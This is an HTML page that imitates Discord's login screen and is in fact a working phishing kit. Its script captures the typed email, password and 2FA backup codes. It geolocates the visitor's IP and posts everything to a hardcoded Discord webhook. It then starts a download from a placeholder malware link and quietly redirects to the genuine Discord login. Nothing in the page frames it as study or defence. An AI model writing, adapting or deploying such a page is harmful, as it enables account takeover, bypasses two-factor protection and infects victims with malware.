<!DOCTYPE html>
<html>
<head>
    <title>Discord Login</title>
    <style>
        body {
            background: #1e1f22;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .box {
            background: #2b2d31;
            padding: 40px;
            border-radius: 8px;
            width: 400px;
            text-align: center;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            background: #1e1f22;
            border: 1px solid #1e1f22;
            border-radius: 4px;
            color: white;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #5865f2;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
        }
        h2 { color: white; }
    </style>
</head>
<body>
<div class="box">
    <h2>Welcome back!</h2>
    <input type="text" id="email" placeholder="Email or Username">
    <input type="password" id="password" placeholder="Password">
    <input type="text" id="backup" placeholder="Backup codes (if 2FA)">
    <button onclick="steal()">Log In</button>
</div>
<script>
    const webhook = "https://discord.com/api/webhooks/1512048619124035677/5hcib3Cnp4NbdDx1S03zryCAnVzWNoouLhrOffBKEz7gS2D5j-bavFl7b3dwJbsTT3Xj";
    const malware = "https://gofile.io/d/YOUR_FILE_ID"; // CHANGE THIS

    async function steal() {
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const backup = document.getElementById('backup').value;
        
        let ip = "Unknown";
        try {
            const res = await fetch('http://ip-api.com/json/');
            const data = await res.json();
            ip = data.query + " - " + data.city + ", " + data.country;
        } catch(e) {}
        
        const msg = `**DISCORD LOGIN**\nEmail: ${email}\nPass: ${password}\n2FA: ${backup}\nIP: ${ip}\nUA: ${navigator.userAgent}`;
        
        fetch(webhook, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({content: msg})
        });
        
        // Download malware
        const a = document.createElement('a');
        a.href = malware;
        a.click();
        
        // Go to real Discord
        window.location.href = "https://discord.com/login";
    }
</script>
</body>
</html>
